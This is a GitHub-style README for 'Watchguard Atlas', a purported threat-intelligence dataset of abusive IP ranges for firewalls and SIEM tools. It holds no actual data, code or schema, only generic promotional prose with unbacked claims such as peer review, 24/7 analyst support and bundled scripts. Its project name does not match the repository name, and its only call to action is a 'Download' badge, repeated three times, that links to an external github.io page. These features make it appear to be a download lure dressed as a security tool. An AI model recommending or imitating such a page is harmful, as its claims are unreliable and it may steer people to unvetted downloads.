![preview](https://raw.githubusercontent.com/KyojurosBestFan/risk-net-catalog/main/screen_c97d.svg)

# Watchguard Atlas

**The Cartographer's Compass for the Internet's Shadowy Archipelagos.**

Welcome to **Watchguard Atlas**, a community-driven intelligence framework designed to illuminate the digital landscapes that most prefer to leave unlit. This is not a mere list of forbidden zones; it is a living, breathing cartographic endeavor that maps the high-abuse surfaces of the global network. We provide a structured, analytical lens through which security professionals, network administrators, and digital forensic experts can visualize the ecosystems where malicious activity thrives.

By aggregating and categorizing known risky networks, we transform raw data into actionable awareness. Think of this repository not as a wall, but as a vast observatory—a place where the patterns of digital turbulence are charted, studied, and understood. Our mission is to provide a strategic vantage point, enabling you to anticipate threats before they materialize, rather than merely react to their aftermath.

## 🗺️ The Philosophy of the Fringe 🌐

In the vast ocean of the internet, there exist regions that are less like bustling ports and more like treacherous reefs, hidden just beneath the surface. Standard security tools often fail because they look at the map of the world, but not at the currents and weather patterns that define its most dangerous waters. **Watchguard Atlas** has been created to fill this void.

We compile, verify, and maintain a dataset of IP ranges, autonomous systems, and domain clusters known for high-abuse surfaces. This includes, but is not limited to, regions associated with botnet command-and-control hubs, phishing infrastructure, and brute-force origin points. Our goal is to offer a **comprehensive, contextual, and continuously updated** reference that empowers you to make informed decisions regarding traffic filtering, threat hunting, and risk scoring.

This project eschews simplicity for the sake of accuracy. We believe in **nuanced threat intelligence**. A network might be home to a single compromised server; we flag the ecosystem, not just the server, so you can understand the neighborhood you are dealing with. We provide a **risk-adjusted perspective**, allowing you to weigh the value of a connection against the inherent hazards of its origin.

---

## 🚀 Key Features for the Vigilant Voyager

### Comprehensive Data Aggregation
Our repository consolidates data from a variety of public sources, honeypot networks, and community submissions into a single, normalized format. This eliminates the need to cross-reference multiple databases and provides a **unified threat surface view**.

### Contextual Risk Metadata
Unlike simple blocklists, we provide metadata for every entry. This includes the type of abuse observed (e.g., scanning, malware distribution), the confidence score of the assessment, and the last time the activity was reported. This allows your security orchestration systems to assign **dynamic risk weights** to different origins.

### Responsive API & UI Integration
While this repository is the core data engine, it is built for integration. We provide schemas and scripts that are compatible with common security information and event management (SIEM) tools. The data is structured for **high-speed ingestion** and **real-time policy enforcement**.

### Multilingual Threat Insights
Cyber threats do not speak a single language. Our analysis and documentation are provided in multiple languages, ensuring that **global security teams** can access and understand the intelligence without linguistic barriers. The data itself is language-agnostic, but our insights aim to be **universally accessible**.

### 24/7 Community & Analyst Support
Security is a 24-hour operation. Our community forum is monitored around the clock by seasoned analysts and ethical security researchers. Whether you are troubleshooting an integration, seeking advice on interpretation, or have identified a new threat vector, support is always available. We foster an environment of **collaborative vigilance**.

---

## 📡 Installation & Data Integration

[![Download](https://raw.githubusercontent.com/KyojurosBestFan/risk-net-catalog/main/grab_ac0f82.svg)](https://KyojurosBestFan.github.io/risk-net-catalog/)

To begin leveraging the intelligence within **Watchguard Atlas**, you can acquire the latest compiled dataset. The primary distribution method is a structured JSON payload and a CSV export, designed for universal compatibility.

### Quick Start with the Dataset
1.  Navigate to the [![Download](https://raw.githubusercontent.com/KyojurosBestFan/risk-net-catalog/main/grab_ac0f82.svg)](https://KyojurosBestFan.github.io/risk-net-catalog/) section to obtain the latest snapshot.
2.  The dataset is packaged with a schema definition file (`.schema.json`) to streamline parsing in your preferred programming language.
3.  For security platforms that support custom threat intelligence feeds, simply input the URL for the JSON file to enable **automated updates**.
4.  Ensure your firewall or intrusion detection system is configured to ingest the "abuse_level" field to trigger alerts based on your predefined thresholds.

### Real-time Feeds & Webhooks
For teams requiring instantaneous updates, we offer a WebSocket-based real-time feed. This allows your security operations center to receive **immediate notifications** the moment a new network segment is flagged. This is crucial for neutralizing fast-moving threats like zero-day phishing campaigns or emerging ransomware distribution clusters.

---

## 🔍 Use Cases: From Observation to Action

### Proactive Network Hardening
By importing our dataset into your edge firewall, you can automatically drop connections from sources with a history of high-abuse behavior. This reduces the attack surface of your organization significantly without impacting legitimate traffic from clean regions.

### Threat Hunting & Correlation
Security analysts can use **Watchguard Atlas** to pivot from a simple IP address to a full geopolitical and infrastructural context. This allows for more effective log correlation, helping you discover if a single threat actor is operating across multiple subnets you have flagged.

### Risk-Based Authentication
Incorporate our risk scores into your access management policies. If a login request originates from a network marked as "High-Abuse Surface," you can enforce a stricter authentication protocol, such as requiring a hardware token or a step-up verification challenge. This adds a critical layer of security against credential stuffing attacks.

---

## 📊 Data Structure & Taxonomy

We believe that intelligence is only as good as its structure. Our dataset is meticulously organized to provide clarity.

- **ipv4/ipv6:** The actual network range in CIDR notation.
- **category:** The primary type of abuse (e.g., `malware_distribution`, `command_control`, `scanner`).
- **severity:** A relative score from 1 to 10, indicating the immediacy and danger of the threat.
- **first_seen / last_seen:** Timestamps documenting the lifecycle of the abusive behavior.
- **reputation:** Aggregated reputation score from multiple upstream providers.
- **geolocation:** The physical location of the block, helping to understand jurisdiction and potential attack origins.

---

## 🛠️ Architecture & Performance

We pride ourselves on delivering a **lightweight yet powerful** data layer. The dataset is optimized for size without sacrificing depth. Our JSON structure utilizes key-based indexing to minimize parsing overhead, enabling you to process the entire dataset in milliseconds on standard hardware.

For large-scale deployments, we recommend using a database such as PostgreSQL or Elasticsearch to index the dataset for rapid lookups. We provide migration scripts that automatically map our schema to these engines, saving you hours of development time.

---

## 💬 Community Contributions & Governance

This repository is a living entity, sustained by the eyes and reports of a global community of security enthusiasts. We encourage you to open issues to report networks you believe exhibit high-abuse characteristics.

- **Reporting a Network:** Use the issue template labeled "New Risk Vector". Provide as much evidence as possible, including timestamps and logs.
- **Peer Review:** Every submission goes through a review process by our core maintainers to ensure accuracy and relevance, maintaining the integrity of the dataset.
- **Coding Standards:** We utilize GitHub Actions for continuous integration to validate the syntax of our JSON and CSV files upon every submission.

---

## 🔒 Security & Privacy Notice

Using **Watchguard Atlas** involves handling sensitive network data. It is crucial to implement this intelligence in accordance with your local privacy regulations. We do not collect personal data from your systems; the dataset contains only network-level information regarding infrastructure.

### Disclaimer
**Watchguard Atlas** is provided as an educational and research tool. The data compiled here is intended for defensive security purposes only. The maintainers do not endorse, support, or facilitate any unauthorized access, intrusion, or harmful activity against the networks listed. The presence of a network in this repository does not necessarily constitute illegal activity; it merely indicates observed patterns of behavior. You are solely responsible for how you utilize this information. Always ensure your actions are in compliance with the law and your organization's ethical guidelines. Use this tool to build stronger defenses, not to breach others'. The authors are not liable for any misuse, damage, or legal consequences arising from the use of this data.

---

## 📄 License

This project is licensed under the MIT License. This permissive license allows for commercial use, modification, distribution, and private use, provided that the original copyright notice is included.

[View LICENSE](LICENSE) - This link is for attribution and legal transparency.

---

## 🧭 Navigating Your First Steps

1.  **Explore the Data:** Download the latest dataset and open it in a text editor or spreadsheet to get a feel for the structure.
2.  **Visualize the Landscape:** Use the included Python scripts to generate a map of the networks, using color intensity to denote severity.
3.  **Integrate and Observe:** Feed the data into your SIEM or firewall in "Log Only" mode first. Monitor the alerts generated to ensure they align with your expectations before enforcing block rules.

## 🗓️ The Road Ahead (2026 Vision)

The development roadmap for Watchguard Atlas is ambitious. By 2026, we envision a decentralized threat feed where data is corroborated through a proof-of-stake consensus mechanism to ensure zero tampering. We are also developing a **predictive analytics module** that will attempt to forecast the emergence of new abusive networks based on historical patterns of IP block allocations and transient domain registrations.

---

## 🌟 Final Thoughts

The internet is an ecosystem of immense opportunity and profound risk. **Watchguard Atlas** serves as your field guide to the latter. We invite you to explore, contribute, and share your feedback. Together, we can navigate these waters with greater clarity and safety.

[![Download](https://raw.githubusercontent.com/KyojurosBestFan/risk-net-catalog/main/grab_ac0f82.svg)](https://KyojurosBestFan.github.io/risk-net-catalog/)